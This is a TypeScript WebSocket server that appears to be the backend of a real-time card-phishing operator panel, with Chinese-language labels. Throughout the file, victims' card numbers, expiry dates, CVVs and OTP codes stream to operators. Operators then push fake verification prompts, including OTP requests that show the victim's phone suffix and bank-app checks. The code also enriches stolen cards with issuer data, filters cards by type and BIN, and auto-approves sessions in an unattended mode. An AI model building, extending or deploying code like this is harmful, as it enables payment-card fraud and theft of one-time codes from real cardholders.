import { WebSocketServer, WebSocket } from 'ws';
import * as paymentService from '../services/payment.service.js';
import { lookupBIN } from '../bin/bin-lookup.js';
import { queryOne } from '../database/connection.js';
import { v4 as uuid } from 'uuid';

const sessions = new Map<string, { customerWs?: WebSocket | null; id: string; sessionId: number }>();
const operators = new Set<WebSocket>();
const customers = new Set<WebSocket>();
const customerSessions = new Map<string, string>();
let sessionCounter = 999;

// Console settings (shared across all operators)
const consoleSettings = {
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off' as 'off' | 'C' | 'D',
  autoRejectBins: [] as string[],
};

function broadcast(type: string, data: any, sessionId?: string) {
  const msg = JSON.stringify({ type, sessionId, payload: data, timestamp: new Date().toISOString() });
  operators.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
}

function sendToCustomer(sessionId: string, data: any) {
  const s = sessions.get(sessionId);
  if (s?.customerWs?.readyState === 1) {
    s.customerWs.send(JSON.stringify({ type: 'operator_action', payload: data, timestamp: new Date().toISOString() }));
  }
}

async function broadcastConnectCount() {
  let opCount = 0;
  operators.forEach(ws => { if ((ws as any)._countable !== false) opCount++; });
  broadcast('connect_count', { customerCount: customers.size, operatorCount: opCount });
}

async function enrichAndSaveCardInfo(cardInfo: any) {
  const clean = (cardInfo.cardNumber || '').replace(/\s/g, '');
  if (!clean || clean.length < 6) return cardInfo;
  const info = await lookupBIN(clean.slice(0, 6));
  if (info.brand) cardInfo.cardType = info.brand;
  if (info.type) cardInfo.cardLevel = info.type;
  if (info.issuer) cardInfo.bankName = info.issuer;
  return cardInfo;
}

export async function setupWebSocket(server: any) {
  // Restore session counter from database
  try {
    const maxRow = queryOne('SELECT MAX(session_id) as mx FROM payment_sessions', []);
    if (maxRow?.mx > sessionCounter) sessionCounter = maxRow.mx;
    console.log('[WS] Session counter initialized:', sessionCounter);
  } catch {}

  const wss = new WebSocketServer({ server });
  console.log('[WS] WebSocket server ready');

  wss.on('connection', (ws: WebSocket, req) => {
    const url = new URL(req.url!, 'http://localhost');
    const role = url.searchParams.get('role');
    const cid = url.searchParams.get('cid');
    const sid = url.searchParams.get('sid');
    const countable = url.searchParams.get('countable') !== '0';
    (ws as any)._countable = countable;

    if (role === 'operator') {
      operators.add(ws);
      broadcastConnectCount();

      (async () => {
        const list = await paymentService.getPaymentSessions();
        // augment browsingTabs with cardHistory + info tabs
        for (const s of list) {
          if (s.cardHistory && s.cardHistory.length > 0 && s.browsingTabs) {
            const hasHist = s.browsingTabs.some((t: any) => t.label === '卡片历史');
            if (!hasHist) s.browsingTabs = [...s.browsingTabs, { label: '卡片历史', count: s.cardHistory.length, active: false }];
          }
          const ci = (s as any).customerInfo || {};
          if (ci.fullName || ci.email || ci.address1 || ci.city) {
            if (s.browsingTabs && !s.browsingTabs.some((t: any) => t.label === '信息页')) {
              s.browsingTabs.push({ label: '信息页', count: 1, active: false });
            }
          }
        }
        ws.send(JSON.stringify({ type: 'session_list', payload: list, timestamp: new Date().toISOString() }));
      })();
    } else if (role === 'customer') {
      customers.add(ws);
      broadcastConnectCount();

      let reusedSessionId = sid;
      if (!reusedSessionId && cid) reusedSessionId = customerSessions.get(cid);
      if (reusedSessionId && sessions.has(reusedSessionId)) {
        const s = sessions.get(reusedSessionId)!;
        s.customerWs = ws;
        paymentService.upsertSession({ id: reusedSessionId, isOnline: true });
        ws.send(JSON.stringify({
          type: 'operator_action',
          payload: {
            action: 'session_restored',
            sessionId: reusedSessionId,
            status: (s as any).status || 'live',
            cardInfo: (s as any).cardInfo || {},
            customerInfo: (s as any).customerInfo || {},
            browsingTabs: (s as any).browsingTabs || [],
            currentStep: (s as any).currentStep || 'card'
          },
          timestamp: new Date().toISOString()
        }));
        broadcast('session_update', { sessionId: reusedSessionId, isOnline: true }, reusedSessionId);
      }
    }

    ws.on('message', async (raw) => {
      let msg: any;
      try { msg = JSON.parse(raw.toString()); } catch { return; }

      try {

      switch (msg.type) {
        case 'customer_input': {
          const counterId = String(++sessionCounter);
          const payload = msg.payload || {};

          // Save to DB immediately (no await for BIN)
          paymentService.upsertSession({
            id: counterId, sessionId: sessionCounter, customerId: cid,
            frontendUrl: payload.frontendUrl, status: 'live', currentStep: payload.currentStep,
            cardInfo: payload.cardInfo, customerInfo: payload.customerInfo,
            browsingTabs: payload.browsingTabs, isOnline: true
          });

          sessions.set(counterId, {
            customerWs: ws, id: counterId, sessionId: sessionCounter,
            cardInfo: payload.cardInfo || {},
            customerInfo: payload.customerInfo || {},
            browsingTabs: payload.browsingTabs || [],
            currentStep: payload.currentStep || 'card',
            frontendUrl: payload.frontendUrl || ''
          });
          if (cid) customerSessions.set(cid, counterId);

          // Broadcast immediately (before BIN enrichment)
          broadcast('session_new', {
            ...payload, id: counterId, sessionId: sessionCounter, status: 'live',
            createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
            isOnline: true, countdownSeconds: 0, cardHistory: []
          }, counterId);

          sendToCustomer(counterId, { action: 'ack', message: 'session_created', sessionId: counterId });

          // async BIN enrichment (non-blocking)
          enrichAndSaveCardInfo(payload.cardInfo || {}).then(() => {
            const s = sessions.get(counterId);
            if (s && payload.cardInfo) {
              Object.assign((s as any).cardInfo, payload.cardInfo);
              broadcast('session_update', { sessionId: counterId, cardInfo: payload.cardInfo }, counterId);
            }
          });
          break;
        }

        case 'session_update': {
          const { sessionId, ...data } = msg.payload;
          if (!sessionId) break;
          const s = sessions.get(sessionId);
          if (!s) break;

          const prevStatus = s.status;

          // merge
          if (data.cardInfo) s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
          if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
          if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
          if (data.currentStep !== undefined) s.currentStep = data.currentStep;
          if (data.frontendUrl !== undefined) s.frontendUrl = data.frontendUrl;
          if (data.sessionId !== undefined) s.sessionId = data.sessionId;

          if (data.status === 'pending') {
            if (prevStatus !== 'pending') {
              s.pendingTs = Date.now();
            }
            s.status = 'pending';
            const curCard = (s as any).cardInfo || {};
            const lastCard = (s as any).lastCardInfo;
            const same = lastCard
              && lastCard.cardNumber === curCard.cardNumber
              && lastCard.expiry === curCard.expiry
              && lastCard.cvv === curCard.cvv;
            if (!same) {
              await paymentService.addCardHistory(sessionId, curCard);
              (s as any).lastCardInfo = { ...curCard };
            }
            await paymentService.upsertSession({ id: sessionId, status: 'pending', cardInfo: curCard });
          }

          await paymentService.upsertSession({
            id: sessionId,
            sessionId: (s as any).sessionId || sessionCounter,
            status: data.status || s.status || 'live',
            currentStep: data.currentStep || s.currentStep,
            cardInfo: s.cardInfo,
            customerInfo: s.customerInfo,
            browsingTabs: data.browsingTabs || s.browsingTabs,
            countdownSeconds: 120
          });

          const updatePayload: any = {
            sessionId,
            cardInfo: s.cardInfo,
            customerInfo: s.customerInfo,
            browsingTabs: data.browsingTabs !== undefined ? data.browsingTabs : s.browsingTabs,
            currentStep: data.currentStep !== undefined ? data.currentStep : s.currentStep,
            frontendUrl: data.frontendUrl !== undefined ? data.frontendUrl : s.frontendUrl,
            status: data.status !== undefined ? data.status : s.status
          };
          if (data.status === 'pending' && prevStatus !== 'pending') {
            updatePayload.countdownSeconds = 120;
          }
          const dbSession = await paymentService.getSessionById(sessionId);
          if (dbSession?.cardHistory && dbSession.cardHistory.length > 0) {
            updatePayload.cardHistory = dbSession.cardHistory;
          }

          // add auxiliary tabs to browsingTabs
          if (updatePayload.browsingTabs) {
            // Card history
            if (dbSession?.cardHistory && dbSession.cardHistory.length > 0) {
              const idx = updatePayload.browsingTabs.findIndex((t: any) => t.label === '卡片历史');
              const hTab = { label: '卡片历史', count: dbSession.cardHistory.length, active: false };
              if (idx >= 0) updatePayload.browsingTabs[idx] = hTab;
              else updatePayload.browsingTabs.push(hTab);
            }
            // Customer info
            const ci = (s as any).customerInfo || {};
            if (ci.fullName || ci.email || ci.address1 || ci.city) {
              if (!updatePayload.browsingTabs.some((t: any) => t.label === '信息页')) {
                updatePayload.browsingTabs.push({ label: '信息页', count: 1, active: false });
              }
            }
          }

          broadcast('session_update', updatePayload, sessionId);

          // Console settings: auto-checks
          if (data.status === 'pending') {
            const ci = (s as any).cardInfo || {};
            const cardNum = (ci.cardNumber || '').replace(/\s/g, '');

            // Auto-reject BIN blacklist
            if (cardNum.length >= 6 && consoleSettings.autoRejectBins.length > 0) {
              const bin6 = cardNum.slice(0, 6);
              if (consoleSettings.autoRejectBins.includes(bin6)) {
                sendToCustomer(sessionId, { action: 'reject', message: '不支持此卡号', sessionId });
                (s as any).status = 'rejected';
                broadcast('session_update', { sessionId, status: 'rejected', action: 'reject', message: '卡头黑名单自动拒绝' }, sessionId);
              }
            }

            // Card type filter
            if (consoleSettings.cardTypeFilter !== 'off') {
              const cardType = ci.cardType || '';
              const isCredit = cardType.includes('CREDIT') || cardType.includes('CLASSIC') || cardType.includes('GOLD') || cardType.includes('PLATINUM') || cardType.includes('SIGNATURE') || cardType.includes('WORLD');
              const isDebit = cardType.includes('DEBIT');
              if ((consoleSettings.cardTypeFilter === 'C' && isDebit) || (consoleSettings.cardTypeFilter === 'D' && isCredit)) {
                const label = consoleSettings.cardTypeFilter === 'C' ? 'C卡(信用卡)' : 'D卡(借记卡)';
                sendToCustomer(sessionId, { action: 'reject', message: '不支持此类卡，仅支持' + label, sessionId });
                (s as any).status = 'rejected';
                broadcast('session_update', { sessionId, status: 'rejected', action: 'reject', message: '卡类型筛选自动拒绝' }, sessionId);
              }
            }

            // Unattended mode: auto-approve after delay
            if (consoleSettings.unattendedMode) {
              setTimeout(() => {
                if ((s as any).status === 'pending') {
                  (s as any).status = 'approved';
                  paymentService.upsertSession({ id: sessionId, status: 'approved' });
                  broadcast('session_update', { sessionId, status: 'approved', action: 'approve', message: '无人值守自动通过' }, sessionId);
                  sendToCustomer(sessionId, { action: 'approve', message: '自动通过', sessionId });
                }
              }, consoleSettings.unattendedSeconds * 1000);
            }
          }

          if (data.cardInfo) {
            enrichAndSaveCardInfo(data.cardInfo).then(() => {
              broadcast('session_update', { sessionId, cardInfo: data.cardInfo }, sessionId);
            });
          }
          break;
        }

        case 'operator_action': {
          const { sessionId, action, message } = msg.payload;
          const s = sessions.get(sessionId);
          paymentService.addAuditLog(sessionId, msg.payload.operatorId || 'unknown', action, message);

          const rejectActions = ['reject', 'card_error', 'otp_error', 'app_verify_fail'];
          const newStatus = action === 'approve' ? 'approved'
            : action === 'redirect_complete' ? 'completed'
            : rejectActions.includes(action) ? 'rejected'
            : 'processing';

          if (s) {
            s.status = newStatus;
            // Clear OTP on change_card
            if (action === 'change_card') {
              (s as any).cardInfo.otpCode = '';
            }
            // Update currentStep for verification actions
            if (action === 'app_verify') {
              s.currentStep = 'app_verify';
            } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
              s.currentStep = 'otp';
            }
          }
          paymentService.upsertSession({ id: sessionId, status: newStatus });

          const bcast: any = { sessionId, status: newStatus, action, message, currentStep: s?.currentStep };
          if (action === 'change_card' && s) {
            // Send full cardInfo so frontend reactivity picks up otpCode change
            bcast.cardInfo = { ...(s as any).cardInfo };
          }
          broadcast('session_update', bcast, sessionId);

          // Build customer message for specific rejections
          let custMsg = message || '';
          let phoneSuffix = '';

          if (action === 'card_error') custMsg = message || 'Card error - please verify your card details';
          if (action === 'otp_error') custMsg = message || 'Verification code error - please try again';
          if (action === 'app_verify_fail') custMsg = message || 'APP verification not completed. Please try again.';
          if (action === 'custom_prompt') custMsg = message || '';
          if (action === 'change_card_prompt') custMsg = message || '请更换卡片重新支付';

          // For app_verify, ensure cardInfo is enriched with bankName before sending
          if (action === 'app_verify' && s && !(s as any).cardInfo.bankName) {
            try {
              await enrichAndSaveCardInfo((s as any).cardInfo);
              broadcast('session_update', { sessionId, cardInfo: { ...(s as any).cardInfo } }, sessionId);
            } catch {}
          }
          if (action === 'otp_verify' || action === 'custom_otp_tail') {
            phoneSuffix = action === 'custom_otp_tail' ? (message || '****') : '';
            if (!phoneSuffix && s) {
              const phone = (s as any).customerInfo?.phone || '';
              phoneSuffix = phone.replace(/\D/g, '').slice(-4) || '****';
            }
          }

          sendToCustomer(sessionId, {
            action,
            message: custMsg,
            sessionId,
            phoneSuffix,
            cardInfo: s ? { ...(s as any).cardInfo } : undefined,
            amount: s ? (s as any).amount || (s as any).cardInfo?.amount : undefined
          });
          break;
        }

        case 'update_settings': {
          Object.assign(consoleSettings, msg.payload || {});
          if (msg.payload?.autoRejectBins && typeof msg.payload.autoRejectBins === 'string') {
            consoleSettings.autoRejectBins = msg.payload.autoRejectBins.split(',').map((b: string) => b.trim()).filter(Boolean);
          }
          console.log('[Settings] Updated:', JSON.stringify(consoleSettings));
          break;
        }

        case 'resend_otp': {
          const { sessionId } = msg.payload;
          const s = sessions.get(sessionId);
          if (!s) break;
          s.otpResendCount = (s.otpResendCount || 0) + 1;
          if (s.otpResendCount > 5) {
            sendToCustomer(sessionId, { action: 'resend_limit', message: 'Maximum resend attempts reached. Please try again later.' });
            break;
          }
          // Notify all operators
          operators.forEach(op => {
            if (op.readyState === WebSocket.OPEN) {
              op.send(JSON.stringify({ type: 'resend_otp', payload: { sessionId, count: s!.otpResendCount } }));
            }
          });
          // Tell customer to wait 1 minute
          sendToCustomer(sessionId, { action: 'resend_ok', message: 'OTP resent', count: s.otpResendCount });
          break;
        }

        case 'app_verify_done': {
          const { sessionId } = msg.payload;
          const s = sessions.get(sessionId);
          if (s) {
            s.status = 'pending';
            s.pendingTs = Date.now();
            paymentService.upsertSession({ id: sessionId, status: 'pending' });
            broadcast('session_update', { sessionId, status: 'pending', action: 'app_verify_done' }, sessionId);
          }
          operators.forEach(op => {
            if (op.readyState === WebSocket.OPEN) {
              op.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId } }));
            }
          });
          break;
        }

        case 'heartbeat':
          ws.send(JSON.stringify({ type: 'heartbeat', payload: 'pong', timestamp: new Date().toISOString() }));
          break;
      }
      } catch (e: any) {
        console.error('[WS] Message error:', e.message || e);
      }
    });

    ws.on('close', () => {
      if (role === 'operator') { operators.delete(ws); }
      else if (role === 'customer') {
        customers.delete(ws);
        for (const [id, s] of sessions) {
          if (s.customerWs === ws) {
            s.customerWs = null;
            paymentService.upsertSession({ id, isOnline: false });
            broadcast('session_update', { sessionId: id, isOnline: false }, id);
          }
        }
      }
      broadcastConnectCount();
    });
  });

  // countdown timer
  setInterval(() => {
    sessions.forEach((s, id) => {
      if (s.status !== 'pending' || !s.pendingTs) return;
      const elapsed = Math.floor((Date.now() - s.pendingTs) / 1000);
      const remaining = Math.max(0, 120 - elapsed);
      if (elapsed % 5 === 0) {
        broadcast('session_update', { sessionId: id, countdownSeconds: remaining }, id);
      }
    });
  }, 1000);
}
